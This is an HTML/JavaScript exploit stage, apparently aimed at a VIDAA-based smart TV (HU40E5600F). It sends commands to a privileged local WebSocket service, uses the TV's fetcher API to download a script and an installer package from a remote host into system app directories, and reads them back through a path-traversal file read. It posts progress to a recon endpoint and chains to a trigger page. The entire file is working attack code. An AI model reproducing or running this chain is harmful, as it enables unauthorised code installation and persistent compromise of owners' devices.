<!doctype html>
<!-- Phase C1 for HU40E5600F (09.09K): start fetcher, fetch sw2.js + installer.ipk
     from the host, verify placement, then chain to trigger.html.
     Posts progress to /api/recon on the same origin. -->
<html><head><meta charset="utf-8"><title>fetch-a</title></head>
<body style="background:#111;color:#0f0;font:20px monospace"><pre id="o">phase C1…</pre>
<script>
(function () {
  "use strict";
  var O = document.getElementById('o');
  function log(m) { O.textContent += "\n" + m; return m; }
  function post(t) {
    try {
      var x = new XMLHttpRequest();
      x.open("POST", "/api/recon", false);
      x.setRequestHeader("Content-Type", "text/plain");
      x.send("FETCH-A\n" + t);
    } catch (e) {}
  }
  function raw(path) {
    try {
      var r = HiUtils_createRequest("fileRead", { path: path, mode: 6 });
      var msg = r.msg;
      if (msg != null && typeof msg === "object") msg = JSON.stringify(msg);
      return { ret: r.ret, msg: String(msg == null ? "" : msg) };
    } catch (e) { return { exception: String(e) }; }
  }
  setTimeout(function () {
    var out = [];
    try {
      var ws = new WebSocket("wss://localhost:9888");
      ws.onopen = function () {
        ws.send(JSON.stringify({ path: "phoenix://service/basic/fetcher", method: "start",
                                 parameters: {}, session: 907, timeout: 10 }));
        setTimeout(function () { try { ws.close(); } catch (e) {} }, 1200);
      };
      out.push("fetcher: start sent");
    } catch (e) { out.push("fetcher EXC " + e); }
    post(out.join("\n"));
    setTimeout(function () {
      try {
        var args = JSON.stringify({ url: location.origin + "/pub/sw2.js",
                                    directory: "/APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/sw2.js",
                                    permission: 420 });
        var r = vowOS.service.syncExecute("basic/fetcher", { api: "fetchFile", args: args });
        out.push("sw2.js -> " + JSON.stringify(r.ret) + " " + JSON.stringify(r.msg).slice(0, 120));
      } catch (e) { out.push("sw2.js EXC " + e); }
      post(out.join("\n"));
      setTimeout(function () {
        try {
          var args2 = JSON.stringify({ url: location.origin + "/pub/installer.ipk",
                                       directory: "/APPS/installer.ipk", permission: 420 });
          var r2 = vowOS.service.syncExecute("basic/fetcher", { api: "fetchFile", args: args2 });
          out.push("ipk -> " + JSON.stringify(r2.ret) + " " + JSON.stringify(r2.msg).slice(0, 120));
        } catch (e) { out.push("ipk EXC " + e); }
        // verify sw2.js landed (text file, safe to read back; never fileRead the .ipk binary)
        var chk = raw("../APPS/pkgs/tv.vidaa.jsservice.basic/CHA/functions/fetch/sw2.js");
        out.push("sw2 readback: ret=" + chk.ret + " head=" + String(chk.msg).slice(0, 60));
        out.push("sw2 readback len=" + String(chk.msg).length);
        post(out.join("\n"));
        log(out.join("\n"));
        if (chk.ret === true && String(chk.msg).indexOf("superwatch_socket") !== -1) {
          log("\nALL PLACED -> chaining to trigger.html in 2s");
          post(out.join("\n") + "\nCHAINING");
          setTimeout(function () { location.href = "trigger.html"; }, 2000);
        } else {
          log("\nPLACEMENT FAILED - staying here; check /recon captures");
          post(out.join("\n") + "\nFAILED-NO-CHAIN");
        }
      }, 4000);
    }, 3000);
  }, 1500);
})();
</script></body></html>
